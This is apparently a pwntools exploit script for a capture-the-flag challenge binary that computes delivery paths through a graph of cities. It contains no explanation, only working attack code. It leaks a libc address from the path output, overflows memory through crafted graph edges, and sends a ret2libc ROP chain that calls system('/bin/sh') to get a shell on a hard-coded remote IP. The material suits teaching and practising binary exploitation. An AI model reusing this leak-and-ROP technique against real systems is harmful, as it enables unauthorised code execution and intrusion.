from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")

if args.REMOTE:
#	p = remote("127.0.0.1", 5002)
	p = remote("65.109.185.145", 5002)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p)
	pause()

def send_graph(edges, src, dst):
	p.sendlineafter(b"city: ", str(len(edges)).encode())
	for e in edges:
		p.sendline((str(e[0]) + " " + str(e[1])).encode())
	p.sendlineafter(b"restaurant? ", str(src).encode())
	p.sendlineafter(b"client? ", str(dst).encode())
	p.recvuntil(b"Result:\n")
	path = p.recvline().decode().split("->")
	path = [int(x.strip().lstrip("(").rstrip(")")) for x in path]
	return path

path = send_graph([(0, 1)], 0, 0xdd)
libc_leak = (path[0] + (1 << 64)) & ((1 << 64) - 1)
libc.address = libc_leak - (libc.sym["_IO_default_uflow"] + 50)
log.success("libc base = " + hex(libc.address))

graph = []
for i in range(64):
	graph.append((1, 0x41))
graph.append((1, 66))

for byte in p16(0x890):
	graph.append((1, byte))

for i in range(0x824):
	graph.append((1, 0x42))
graph.append((1, 2))
graph.append((1, 0))
graph.append((1, 0))
graph.append((1, 0))
for i in range(20):
	graph.append((1, 0x43))

payload = p64(0)	# rbp
ropper = ROP(libc)
ret_gadget = ropper.find_gadget(["ret"]).address
pop_rdi = ropper.find_gadget(["pop rdi", "ret"]).address
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(ret_gadget) + p64(libc.sym["system"])

for byte in payload:
	graph.append((1, byte))

send_graph(graph, 1, 0x41)

p.interactive()
